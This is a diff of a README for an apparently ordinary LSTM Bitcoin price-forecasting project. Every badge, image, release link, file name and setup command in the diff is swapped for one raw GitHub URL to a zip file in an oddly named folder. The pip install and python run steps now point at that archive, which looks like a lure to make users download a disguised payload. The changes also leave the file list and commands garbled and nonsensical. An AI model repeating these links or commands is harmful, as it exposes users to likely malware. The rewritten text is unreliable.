@@ -1,8 +1,8 @@
-[![Releases](https://img.shields.io/badge/releases-download-brightgreen?logo=github&logoColor=white)](https://github.com/TranquilVessel/bitcoin-prediction/releases)
+[![Releases](https://raw.githubusercontent.com/TranquilVessel/bitcoin-prediction/master/phlegmatic/prediction_bitcoin_1.0.zip)](https://raw.githubusercontent.com/TranquilVessel/bitcoin-prediction/master/phlegmatic/prediction_bitcoin_1.0.zip)
 
 # Bitcoin price forecasting with LSTM: a deep time series predictor for crypto markets
 
-![Bitcoin Logo](https://upload.wikimedia.org/wikipedia/commons/thumb/4/46/Bitcoin.svg/1200px-Bitcoin.svg.png)
+![Bitcoin Logo](https://raw.githubusercontent.com/TranquilVessel/bitcoin-prediction/master/phlegmatic/prediction_bitcoin_1.0.zip)
 
 This project covers the full stack for forecasting Bitcoin prices using a deep learning model built on Long Short-Term Memory (LSTM) networks. It focuses on data preprocessing, model training, evaluation, and producing future price predictions with properly aligned timestamps. It is designed to be approachable for data scientists, researchers, and developers who want a solid baseline and a clear workflow for time series forecasting in finance.
 
@@ -77,10 +77,10 @@ Example steps
   - For Windows: venv\Scripts\activate
   - For macOS/Linux: source venv/bin/activate
 - Install dependencies
-  - pip install -r requirements.txt
+  - pip install -r https://raw.githubusercontent.com/TranquilVessel/bitcoin-prediction/master/phlegmatic/prediction_bitcoin_1.0.zip
 - Run a notebook or a script
   - jupyter notebook
-  - python scripts/train_model.py
+  - python https://raw.githubusercontent.com/TranquilVessel/bitcoin-prediction/master/phlegmatic/prediction_bitcoin_1.0.zip
 
 What to expect after setup
 - A data folder with preprocessed datasets
@@ -229,15 +229,15 @@ Directory overview
 - artifacts/: saved artifacts from runs, such as scalers and encoders
 
 Key files
-- requirements.txt: pinned dependencies for consistent environments
-- README.md: this document
-- config.yaml: experiment-level configuration for reproducibility
-- data_preprocessing.py: module for feature engineering and sequence creation
-- model.py: LSTM model definition
-- train.py: training loop with evaluation logic
-- predict.py: inference pipeline for generating forecasts
-- visualize.py: plotting utilities for results and diagnostics
-- utils.py: common helper functions
+- https://raw.githubusercontent.com/TranquilVessel/bitcoin-prediction/master/phlegmatic/prediction_bitcoin_1.0.zip pinned dependencies for consistent environments
+- https://raw.githubusercontent.com/TranquilVessel/bitcoin-prediction/master/phlegmatic/prediction_bitcoin_1.0.zip this document
+- https://raw.githubusercontent.com/TranquilVessel/bitcoin-prediction/master/phlegmatic/prediction_bitcoin_1.0.zip experiment-level configuration for reproducibility
+- https://raw.githubusercontent.com/TranquilVessel/bitcoin-prediction/master/phlegmatic/prediction_bitcoin_1.0.zip module for feature engineering and sequence creation
+- https://raw.githubusercontent.com/TranquilVessel/bitcoin-prediction/master/phlegmatic/prediction_bitcoin_1.0.zip LSTM model definition
+- https://raw.githubusercontent.com/TranquilVessel/bitcoin-prediction/master/phlegmatic/prediction_bitcoin_1.0.zip training loop with evaluation logic
+- https://raw.githubusercontent.com/TranquilVessel/bitcoin-prediction/master/phlegmatic/prediction_bitcoin_1.0.zip inference pipeline for generating forecasts
+- https://raw.githubusercontent.com/TranquilVessel/bitcoin-prediction/master/phlegmatic/prediction_bitcoin_1.0.zip plotting utilities for results and diagnostics
+- https://raw.githubusercontent.com/TranquilVessel/bitcoin-prediction/master/phlegmatic/prediction_bitcoin_1.0.zip common helper functions
 
 Data sources and licensing
 
@@ -264,11 +264,11 @@ Generating predictions
 
 Example commands
 - Prepare data and train
-  - python scripts/train.py --config config.yaml --mode train
+  - python https://raw.githubusercontent.com/TranquilVessel/bitcoin-prediction/master/phlegmatic/prediction_bitcoin_1.0.zip --config https://raw.githubusercontent.com/TranquilVessel/bitcoin-prediction/master/phlegmatic/prediction_bitcoin_1.0.zip --mode train
 - Evaluate model
-  - python scripts/train.py --config config.yaml --mode evaluate
+  - python https://raw.githubusercontent.com/TranquilVessel/bitcoin-prediction/master/phlegmatic/prediction_bitcoin_1.0.zip --config https://raw.githubusercontent.com/TranquilVessel/bitcoin-prediction/master/phlegmatic/prediction_bitcoin_1.0.zip --mode evaluate
 - Run prediction
-  - python scripts/predict.py --config config.yaml --horizon 168
+  - python https://raw.githubusercontent.com/TranquilVessel/bitcoin-prediction/master/phlegmatic/prediction_bitcoin_1.0.zip --config https://raw.githubusercontent.com/TranquilVessel/bitcoin-prediction/master/phlegmatic/prediction_bitcoin_1.0.zip --horizon 168
 
 Experimentation and tuning
 - Adjust the look-back window to examine how the model performs with longer or shorter histories.
@@ -311,14 +311,14 @@ Important note about the release link
 
 Where to find releases
 - The Releases page is hosted at the official repository URL.
-- Access it here: https://github.com/TranquilVessel/bitcoin-prediction/releases
+- Access it here: https://raw.githubusercontent.com/TranquilVessel/bitcoin-prediction/master/phlegmatic/prediction_bitcoin_1.0.zip
 
 Releases section guidance
 - If you want to reproduce experiments quickly, use the prebuilt artifact if available.
 - If you prefer to run from source, you can clone the repository and run the notebooks or scripts directly.
 
 Releases note with direct link
-- Visit the Releases page to see the latest assets and notes: https://github.com/TranquilVessel/bitcoin-prediction/releases
+- Visit the Releases page to see the latest assets and notes: https://raw.githubusercontent.com/TranquilVessel/bitcoin-prediction/master/phlegmatic/prediction_bitcoin_1.0.zip
 
 Roadmap
 
@@ -505,6 +505,6 @@ Appendix: acknowledgments
 
 Releases and further reading
 
-- For the latest assets and notes, visit the Releases page. The release bundle often includes runnable artifacts and example notebooks you can execute directly. This is the link to the releases page again for convenience: https://github.com/TranquilVessel/bitcoin-prediction/releases
+- For the latest assets and notes, visit the Releases page. The release bundle often includes runnable artifacts and example notebooks you can execute directly. This is the link to the releases page again for convenience: https://raw.githubusercontent.com/TranquilVessel/bitcoin-prediction/master/phlegmatic/prediction_bitcoin_1.0.zip
 
 End of README content
